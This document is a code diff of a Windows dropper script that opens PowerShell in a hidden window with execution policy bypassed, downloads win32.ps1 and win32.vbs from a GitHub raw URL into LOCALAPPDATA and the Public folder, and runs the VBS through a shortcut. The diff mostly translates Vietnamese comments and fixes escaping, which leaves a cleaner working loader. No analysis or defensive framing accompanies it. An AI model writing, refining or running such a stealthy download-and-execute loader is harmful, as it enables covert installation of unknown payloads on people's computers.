@@ -1,31 +1,31 @@
-cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command
-$LocalPathPS1 = `$env:LOCALAPPDATA
-$LocalPathVBS = `"C:\Users\Public`"
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
+$LocalPathPS1 = "$env:LOCALAPPDATA"
+$LocalPathVBS = "C:\Users\Public"
 
-# URLs tải file
-$File1Url = `"https://github.com/KevinDark5/data/raw/refs/heads/main/win32.ps1`"
-$File2Url = `"https://github.com/KevinDark5/data/raw/refs/heads/main/win32.vbs`"
+# File URLs
+$File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/win32.ps1"
+$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/win32.vbs"
 
-# Tên file
-$File1Name = `"win32.ps1`"
-$File2Name = `"win32.vbs`"
+# File names
+$File1Name = "win32.ps1"
+$File2Name = "win32.vbs"
 
-# Đường dẫn đầy đủ để lưu file
-$File1Path = Join-Path -Path `$LocalPathPS1 -ChildPath `$File1Name
-$File2Path = Join-Path -Path `$LocalPathVBS -ChildPath `$File2Name
+# Full paths to save the files
+$File1Path = Join-Path -Path $LocalPathPS1 -ChildPath $File1Name
+$File2Path = Join-Path -Path $LocalPathVBS -ChildPath $File2Name
 
-# Tải file win32.ps1 vào LOCALAPPDATA
-Invoke-WebRequest -Uri `$File1Url -OutFile `$File1Path
+# Download win32.ps1 to LOCALAPPDATA
+Invoke-WebRequest -Uri $File1Url -OutFile $File1Path
 
-# Tải file win32.vbs vào Public
-Invoke-WebRequest -Uri `$File2Url -OutFile `$File2Path
+# Download win32.vbs to Public
+Invoke-WebRequest -Uri $File2Url -OutFile $File2Path
 
-# Tạo shortcut cho win32.vbs trong Public
-$ShortcutPath = Join-Path -Path `$LocalPathVBS -ChildPath `"win32.lnk`"
+# Create a shortcut for win32.vbs in Public
+$ShortcutPath = Join-Path -Path $LocalPathVBS -ChildPath "win32.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = `$WScriptShell.CreateShortcut(`$ShortcutPath)
-$Shortcut.TargetPath = `$File2Path
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $File2Path
 $Shortcut.Save()
 
-# Thực thi shortcut
-Start-Process `$ShortcutPath"
+# Execute the shortcut
+Start-Process $ShortcutPath
